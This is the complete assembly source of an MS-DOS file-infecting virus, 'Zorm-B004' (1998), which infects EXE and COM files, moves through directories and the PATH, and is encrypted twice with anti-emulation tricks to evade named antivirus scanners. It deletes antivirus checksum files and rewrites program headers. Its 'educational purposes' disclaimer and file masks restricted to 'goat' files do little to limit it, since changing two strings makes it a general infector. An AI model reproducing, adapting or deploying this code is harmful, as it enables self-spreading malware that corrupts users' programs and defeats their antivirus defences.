
;
;    ллллллллллллллллллллл\ лллллллллллл\ лллллллллллллл\     лл\         лл\
;                  млллл\   лл\       лл\ лл\        ллл\     лллл\     лллл\
;                млллл\     лл\       лл\ лл\        ллл\     лл\ лл\ лл\ лл\
;              млллл\       лл\       лл\ лллллллллллл\ \     лл\   лл\   лл\                        
;            млллл\         лл\       лл\ лл\         лл\     лл\         лл\
;          млллл\           лл\       лл\ лл\          лл\    лл\         лл\                                        
;        млллл\             лл\       лл\ лл\           лл\   лл\         лл\
;      млллл\               лл\       лл\ лл\            лл\  лл\         лл\
;    млллллллллллллллллллл\ лллллллллллл\ лл\             лл\ лл\         лл\
;
;(C)By Dr L. from Lamer Corporation  March/July 1998
;
;Description:
;             -      Name:..........Zorm-B004     
;             -      Mode:..........Direct infector no TSR
;             -    Target:..........Exe/Com of Msdos (even com of dos7+)
;             -    Status:..........Not detected by Tbav806,F-prot301,228        
;                                   dr.Web,Avp30,nod-ice,findvirus786  
;                                                   (2nd+ generations)      
;             - Description: 
;               This virus infects 2 exe+2 com files when executed.             
;               Can change of directory by using both dot-dot method
;               and the path variable of dos environnment.
;               It doesnt contain nasty routines.
;               Its twice encrypted and use several anti-emulation
;               routines.It doesnt infect command.com and win.com 
;               of win95.  
;               It erases most checksums files made by anti-virus  
;               in the directories where it have found targets to
;               infect.
;               Anti-lamer routine included :)
;
;             - Disclaimer:
;               This virus was written for research and educationnal
;               purposes.
;               Its the 4th version of this serie.
;               I have fixed some bugs.
;               But one problem still remains:
;                       This virus can damaged win.com/command.com of
;                       win31 when executed or maybe all can be fine
;                       i cant study this problem cause i dont have 
;                       win31!
;                          
;                         
;               Compile :tasm/m2 ,tlink/t 
;                    



.model tiny                         ;memory model
.code                               ;size <65536 

org 100h                            ;its a com file


;-------------------------Beginning---of----loader----------------------
start1:                               
db 0e9h,1,0                         ;jmp 001 byte forward
db 'V'                              ;infection mark

push ds                             ;save dx for later

push  cs                            ;set ds=cs
pop   ds                            ; 
        
mov word ptr [_ds],ds               ;save original ds for 
                                    ;later
          
mov byte ptr [com_virus],0          ;for the first time           
                                    ;you have to  do that
                                    ;(read below)
 
mov bp,0                            ;set bp the delta offset
                                    ;to zero.No shift to begin
 

jmp over_there

;---------------------------End-----of------loader----------------------


                                  

;----------------------------Beginning--of--virus-----------------------
start:                                
xor dx,dx                           ;set dx=0 for stability
mov cx,end_2nd-begin_2nd            ;cx=nber of bytes to decrypt
xor ax,ax
int 15h
cmp ah,86h                          ;thanx to yesna to show me this 
jz itsok                            ;trick ;) 
mov ah,4ch
int 21h
itsok:

 
mov ah,3dh                          ;anti-emulation trick. function 3dh 
int 21h                             ;int 21h= open file function.ds:dx
;mov al,02h                                    ;have to point to file name.
                                    ;but ds:dx points tojunk so dos returns
                                    ;al=02h.We use this value to decrypt
  
db 04h                              ;=add al,10h
       value db 10h                 ;

               
db 0bbh                             ;mov bx,patch
patch:                              ;patch=addr of begin_2nd.
       dw 0                         ;patch will be set later. 
                                    
;settings for decrypt bytes between begin_2nd and end_second is over.



;--------------------------------------------------------
;crypt/decrypt "routine"
;
;remark: _ret will be changed into "ret"  to transform this part 
;in a real asm routine.


crypt:
turn_again:
xor byte ptr cs:[bx],al
inc bx
loop turn_again
_ret:                               ;
     ret                            ;to be replaced

;--------------------------------------------------------


begin_2nd:
          db 2eh,0c6h,06h           ;=mov byte ptr cs:[ret_addr],c3h
ret_addr:                           ;
          dw 0                      ;(ret_addr=address where to put 'ret'.  
          db 0c3h                   ;c3h=opcode for "ret")
          

          db 0bbh                   ;=mov bx,0000h
          patch2:                   ;
              dw 0                  ;(patch2=addr of beginning of begin_main)
       
          db 0b0h                   ;=mov al,2
              _al:                  ;
              db 2                  ;
                                    ;(_al=xor key.Not fixed value during
                                    ;infection scheme.see below)   

 mov cx,end_main-begin_main         ;setting to decrypt bytes between 
                                    ;label begin_main and end_main is
                                    ;complete
                                     
 call crypt                         ;decrypt now!
 end_2nd:

       begin_main:
                  mov ax,ss         ;if cs=ss i'm a com 
                  mov cx,cs         ;
                  cmp ax,cx         ;if not,i'm exe! 
                   jz im_com        ;

im_exe:                  
                  cli               ;
                  mov ax,ss         ;reset ss=cs 
                  dec ax            ;at the start ss=cs+1 to avoid
                  mov ss,ax         ;"k" flag of tbav.Maybe its a  
                  sti               ;lame way to do that but dont know
                                    ;how to use an other way.
 
  call compute_delta

  push ds                           ;save ds for later
    
  push cs                           ;set ds=cs
  pop  ds                           ;

  mov byte ptr [com_virus+bp],0     ;i'm not a com (save this info
                                    ;for later) 
  jmp next_exe                      ;whats follow for a exe file host?
                                    
im_com:

push ds                             ;save it for later



compute_delta_offset:
call compute_delta 
mov byte ptr [com_virus+bp],1       ;yep i'm a com file 

next_exe:

pop ax                              ;set ax=original ds
mov word ptr [_ds+bp],ax            ;set _ds=original ds
                                    ;you need it for pass
                                    ;control to host.

over_there:                         ;remember me?
                                    ;for the first execution 
                                    ;no need to decrypt
                                    

push es                             ;save es
     
push cs                             ;set es=cs
pop  es                             ;

cmp byte ptr [com_virus+bp],1       ;i'm a com?
 
jnz follow_me                       ;nope
 
lea si,store_bytes+bp               ;yep i'm 
mov di,100h                         ;ready to transfer byte from
                                    ;location "store_bytes" to 
                                    ;beginning of (com) host.
                                    ;(remember the code of *.com
                                    ;begin to cs:100h in memory)   

jmp transfer

follow_me: 
;cld
lea si,store+bp                     ;transfer from label "store"
lea di,old+bp                       ;to label "old"
movsw                               ;(set the correct values, segment: 
movsw                               ;offset for the return to host.)

transfer:
movsw                               ;you came from "mov di,100h"? ok 
movsw                               ;restore (in memory only) the 4 first  
                                    ;originals bytes of host.
 
                                    ;you came from "follow me"? ok restore
                                    ;originals cs:ip and ss:sp found in
                                    ;host (exe) header
 
pop es                              ;beware im back!
 
lea dx,new_dta+bp                   ;dont modify dta!
call set_dta                        ;change it!

mov byte ptr [flag_com+bp],'E'      ;at first we want to infect Exe
                                    

push es                             ;see you later!

create_new_int24h_handler:
mov ax,3524h                        ;                         
int 21h                             ;save original handler                          
mov word ptr [bp+old_int24h],bx     ;of int 24h for restore                         
mov word ptr [bp+old_int24h+2],es   ;it later.                         

mov ah,25h                          ;set a new handler for
lea dx,bp+int_24h                   ;int 24h.
int 21h                             ;so dos dont pop up 
                                    ;a infamous error message if virus
                                    ;try to infect write protected
                                    ;disk.

pop es                              ;its me again babe!

count:
mov byte ptr [count_infect+bp],0    ;reset the counter to 0
                                    ;self explanory 

get_dir:

 mov ah,47h                         ;
 lea si,current_dir+bp              ;save the current directory
 xor dl,dl                          ;for later when virus pass 
 int 21h                            ;control to host and the return to 
                                    ;dos.the size of buffer is  64 bytes.
get_disk:
         mov ah,19H                 ;from a:or b:or...virus is running?       
         int 21h                    ;
         mov byte ptr [disk+bp],al  ;
         cmp al,02H                 ;virus infect c: not other drive.
                                    ;in practice .
         jz search_begin_path       ;but if you are running the virus 
         mov dl,02h                 ;from an drive ,not c:,it infects
         mov ah,0eh                 ;drive c:.
         int 21h                    ;
;-------------------------------------------------------------
;this part search the adress of first byte of the name of the 
;first directory include in dos path 
;remarks:
;         es is destroyed by the routine
;         es:di points to the address
;         we are searching
          
search_begin_path:

mov ax,es:002ch                     ;es:002ch=address of segment where
mov es,ax                           ;to found in memory the dos path.  
xor di,di                           ;
mov si,di

jmp suite                               
yet: 
      inc si
      mov di,si                          
suite:
     mov ax,'AP'                    ;
     scasw                          ;
     jnz yet                        ;
     mov ax,'HT'                    ;search the string 'PATH='
     scasw                          ;in memory
     jnz yet                        ;
     mov al,'='                     ;
     scasb                          ;
     jnz yet                        ;


;---------------------------------------------------------------------------





;------------------------------------------------------------------
;main part of virus routine to search for files
;to infect.

pathdir:                            ;
       call search                  ;go to search in current dir
again1:                             ;
       jc parent                    ;no file found go to "parent"
       call infect                  ;one file found infect it! 
       
   cmp byte ptr [count_infect+bp],2 ; 
   jz end_infect                    ;
   call search_again                ;
   jmp again1                       ;
parent:    
       call up_dir                  ; 
       jnc pathdir                  ;
change_to_c:        
       call change_path_dir         ;
       jnz pathdir                  ;
       jmp end_infect               ;
;------------------------------------------------------------------

infect:
         mov ax,3d02h
         lea dx,new_dta+1eh+bp
         int 21h

read_header:
         
            xchg ax,bx
            mov ah,3fh
            mov cx,1ch
            lea dx,exe_header+bp
            int 21h
test1:
            cmp word ptr [exe_header+bp],'ZM';is it really an exe?
            je test3
test2:
            cmp word ptr [exe_header+bp],'MZ';idem
            jne its_a_com
test3:
            cmp word ptr [exe_header+bp+12h],'VI';infected?
            je terminer                          ;yes,bye bye

test3b: 
            cmp word ptr [exe_header+bp+2],00c6h
            jne test4
            cmp word ptr [exe_header+bp+4],00b7h
            je terminer 
test4:
            cmp word ptr [exe_header+bp+26],0    ;overlay=0?
            jne terminer                         ;not,bye bye
test5:
            cmp word ptr [exe_header+bp+24],40h  ;windows exe?  
            je terminer                          ;yes ,adios :(

            mov byte ptr [com_target+bp],0
            jmp get_attributes
its_a_com:   

test_com:
             cmp byte ptr [exe_header+bp+3],'V'
             jz terminer
test_win:
             cmp word ptr [exe_header+4+bp],0e1fh
             jnz not_win_com
             cmp word ptr [exe_header+6+bp],0e807h
             jz terminer

 not_win_com:
             jmp suit
             end_infect:
             jmp end_infect2
             suit:
             push di
             push es
             push cs
             pop es
             mov byte ptr [com_target+bp],1

             lea si,exe_header+bp
             lea di,store_bytes+bp
             movsw
             movsw
             pop es
             pop di

get_attributes:
                 mov ax,4300h
                 lea dx,new_dta+1eh+bp
                 int 21h
                 mov word ptr [attribute+bp],cx
set_attributes:
                 lea dx,new_dta+1eh+bp
                 call set_attrib
kill_crc_files:


;-----------------------------------------------
;delete crc files

                 lea dx,killfile1+bp
                 call set_attrib
                 call kill_file
 jmp next
 terminer:
 jmp close_file
 next: 
                 lea dx,killfile2+bp
                 call set_attrib
                 call kill_file

                 lea dx,killfile3+bp
                 call set_attrib
                 call kill_file
;------------------------------------------------

 
get_time_date:
                 mov ax,5700h
                 int 21h
                 push cx
                 push dx
cmp byte ptr [com_target+bp],1
jz go_end_of_file
store_info_header:
                   mov ax,word ptr [exe_header+bp+0eh]
                   mov word ptr [store_ss+bp],ax
                   mov ax,word ptr [exe_header+bp+10h]   
                   mov word ptr [store_sp+bp],ax
 
                   mov ax,word ptr [exe_header+bp+14h]
                   mov word ptr [store_ip+bp],ax

                   mov ax,word ptr [exe_header+bp+16h]
                   mov word ptr [store_cs+bp],ax         
go_end_of_file:
 call go_end
 cmp byte ptr [com_target+bp],1
 jnz next_exe_infect
sub ax,7
xchg ax,dx
mov cx,0
mov ax,4200h
int 21h


mov ah,03fh
mov cx,07h
lea dx,queue+(end_virus-start)+bp
int 21h


add word ptr [queue+(end_virus-start)+5+bp],end_virus-start+7
call go_end
mov cx,ax
sub ax,3
mov word ptr [jmp_bytes+bp+1],ax

 add cx,100h
 jmp  change_patch

 next_exe_infect:     

       push ax dx

compute_new_csip:
                  push ax
                  mov ax,word ptr [exe_header+bp+8]
                  mov cl,4
                  shl ax,cl
                  mov cx,ax
                  pop ax
                  sub ax,cx
                  sbb dx,0
                  mov cl,0ch
                  shl dx,cl
                  mov cl,4
                  push ax
                  shr ax,cl
                  add dx,ax
                  shl ax,cl
                  pop cx
                  sub cx,ax 
change_header:
                  mov word ptr [exe_header+bp+14h],cx
                  mov word ptr [exe_header+bp+16h],dx
                  inc dx
                  mov word ptr [exe_header+bp+0eh],dx
                  mov word ptr [exe_header+bp+10h],0FF0h
                  mov word ptr [exe_header+bp+0ah],00FFh
                  mov word ptr [exe_header+bp+12h],'VI'
change_patch:
                  push cx
                  add cx,begin_main-start
                  mov word ptr [patch2+bp],cx
                  pop cx
                  push cx
                  add cx,_ret-start
                  mov word ptr [ret_addr+bp],cx
                  pop cx
                 
                  add cx,begin_2nd-start
                  mov word ptr [patch+bp],cx
                  cmp byte ptr [com_target+bp],1
                  jz write_virus   
                  pop dx ax
compute_size:
                  add ax,end_virus-start
                  adc dx,0
                  mov cx,512
                  div cx
                  cmp dx,0
                  je enough
                  inc ax
      enough:
                  mov word ptr [exe_header+bp+04],ax
                  mov word ptr [exe_header+bp+02],dx
 write_virus:
                  encipher:
                  call encrypt
                  ;--------------------------------
                  ;routine to avoid tbav "U" flag
                  ;"U"=undocumented dos interrupt
                  ;in fact tbav sets this flag
                  ;if it finds "cdh,xyh" string
                  ;where xy isnt a ordinary value
                  ;for an interrupt. 
    
                  lea si,queue+bp+(begin_2nd-start)
                  mov cx,end_virus-begin_2nd
      test_int:   
                  
                 cmp byte ptr [si],0cdh
                 je encipher
                 inc si 
                 loop test_int
                  ;-------------------------------

                  ;-------------------------------
                  ;90h=nop replace 'ret' by 'nop'
                  ;for the first execution of crypt
                  ;routine by the target exe
                  ;in the buffer before write it.   
                  mov byte ptr [bp+queue+(_ret-start)],90h 
                  ;-------------------------------
                 
                  ;-------------------------------
                  ;write the virus to the target file
                  mov ah,40h
                  mov cx,(end_virus-start)+7
                  lea dx,bp+queue
                  int 21h
                  ;-------------------------------
                  
                  ;-------------------------------
                  ;set the file pointer of target to
                  ;the beginning.
go_beginning:
                  mov ax,4200h
                  xor cx,cx
                  cwd
                  int 21h
                  ;-------------------------------

copy_new_header:
                  cmp byte ptr [com_target+bp],1
                  jnz copy_exe
                  lea dx,jmp_bytes+bp
                  mov cx,4
jmp go_copy
copy_exe:        
                  mov cx,1ah
                  lea dx,exe_header+bp
go_copy:
                  mov ah,40h
                  int 21h
inc_counter:
                  inc byte ptr [count_infect+bp]
restore_file_attribute:
                       mov cx,attribute+bp
                       lea dx,1eh+bp+new_dta
                       mov ax,4301h
                       int 21h
restore_date_time:
                       mov ax,5701h
                       pop dx
                       pop cx
                       int 21h   
  close_file:
                  mov ah,3eh
                  int 21h
                  ret

 end_infect2:


restore_disk:           
                  mov dl,byte ptr [disk+bp]
                  mov ah,0Eh
                  int 21h                  
                  
restore_directory:                   
                  mov ah,3bh
                  mov byte ptr [slash+bp],'\'
                  lea dx,[current_dir-1]+bp
                  int 21h
cmp byte ptr [flag_com+bp],'C'
jz exit

mov byte ptr [flag_com+bp],'C'    ;set this flag to avoid 
jmp count 

exit:

restore_initial_ds_value:

                  mov ax,word ptr [_ds+bp]
                  push ax
                  pop ds

restore_initial_dta:
                  mov dx,80h
                  call set_dta
restore_initial_24h_interrupt:

                 push ds
                 mov ax,2524h
                 lds dx,bp+old_int24h
                 int 21h
                 pop ds

restore_initial_es:                  
                  push ds
                  pop es

cmp byte ptr [com_virus+bp],1
jnz finish_exe

return_com_host:

                 mov ax,100h
                 push ax
                 ret
finish_exe:
                  mov ax,es
                  add ax,10h

set_cs_of_host_to_run_it:                  
                  add word ptr cs:[old_cs+bp],ax
set_stack_of_host:
                  cli
                  add ax,word ptr cs:[bp+old_ss]
                  mov ss,ax                     
                  mov sp,word ptr cs:[bp+old_sp]
                  sti
go_to_host_code:
                  db 0eah     ; :=jmp xxxx:yyyy
old:
                  old_ip dw 0 ;            yyyy 
                  old_cs dw 0 ;       xxxx 
                  old_sp dw 0
                  old_ss dw 0
store:
                  store_ip dw 0
                  store_cs dw 0fff0h
                  store_sp dw 0
                  store_ss dw 0fff0h

;-----------------------------------
;search in current directory.

search:
                  mov ah,4eh
                  cmp byte ptr [flag_com+bp],'C'
                  jnz its_exe
                  lea dx,com_file+bp
                  jmp its_com
        its_exe:
                  lea dx,file_mask+bp
        its_com:
                  mov cx,7
                  int 21h
                  ret
search_again:
                  mov ah,4fh
                  int 21h
                  ret
;-----------------------------------





;-----------------------------------
;change directory to parent dir.

up_dir:
                  mov ah,3bh
                  lea dx,dot_dot+bp
                  int 21h
                  ret
;-----------------------------------





;-----------------------------------
;find the next dir in dos path
;and set current dir=dir found.

change_path_dir:  

                  lea si,new_dir+bp
        notyet:   
                  cmp byte ptr es:[di],';'
                  jz _end 
                  cmp byte ptr es:[di],0
                  jz _end2
                  mov ah,byte ptr es:[di]
                  mov byte ptr [si],ah
                  inc di
                  inc si
                  jmp notyet
                  _end:
                       mov byte ptr [si],0
                       inc di
                  mov ah,3bh
                  lea dx,new_dir+bp
                  int 21h 
                  ret
                  _end2:
                   xor ax,ax
                         ret
;------------------------------------------


 encrypt:
                  push ax
                  push bx
 
change_xor_value:
                  mov al,byte ptr [_al+bp]
                  inc al
                  cmp al,0
                  jne more
                  inc al
             more:
                  mov byte ptr [_al+bp],al
                  
                  mov ah,byte ptr [value+bp]
                  
                  inc ah
                  cmp ah,0  	
                  jne again
                  inc ah
             again:
                  mov byte ptr [value+bp],ah


 copy_virus_to_queue_buffer:
                  ;cld                 
                  push di
                  push es
                  push cs
                  pop es
                  lea si,start+bp
                  lea di,queue+bp
                  mov cx,end_virus-start
                  rep movsb
                  pop es
                  pop di
crypt_main_part_of_virus_in_buffer:
                  
                  mov cx,end_main-begin_main
                  lea bx,queue+(begin_main-start)+bp
                  call crypt
                  xchg al,ah

                  inc al
                  inc al
crypt_2nd_part_of_virus_in_buffer:

                                   mov cx,end_2nd-begin_2nd
                                   lea bx,queue+(begin_2nd-start)+bp
                                   call crypt
  
                                   pop bx
                                   pop ax
                                   ret
set_attrib:
                  mov ax,4301h
                  xor cx,cx
                  int 21h
                  ret
kill_file:
                  mov ah,41h
                  int 21h
                  ret
int_24h:
                  mov al,3
                  iret
set_dta:
                  mov ah,1ah
                  int 21h
                  ret
compute_delta:
                  call delta
        delta:
                  pop bp
                  sub bp,offset delta
                  ret
       go_end:
                  mov ax,4202h
                  xor cx,cx 
                  cwd
                  int 21h
                  ret
                  
                  signature db  '(c)Zorm-b004 by Dr.L  March/July98'      
                  jmp_bytes db  0e9h,0,0,'V'
                store_bytes db  90h,90h,0cdh,20h                
                  killfile1 db 'anti-vir.dat',0
                  killfile2 db 'chklist.ms'  ,0
                  killfile3 db 'chklist.cps' ,0
                    dot_dot db '..',0
                  file_mask db 'goat*.exe',0    ;anti-lamer routine
                   com_file db 'goat*.com',0  
                  
end_main:
 

end_virus:
                     com_target db            ?
                     com_virus  db            ?
                      flag_com  db            ? 
                          disk  db            ?  
                     attribute  dw            ?
                    old_int24h  dd            ?              
                           _ds  dw            ?
                  count_infect  db            ?
                         slash  db            ?
                   current_dir  db  64  dup  (?)
                    exe_header  db  1ch dup  (?)
                       new_dta  db  43  dup  (?)
                       new_dir  db  64  dup  (?)
    queue: 
end start1                                  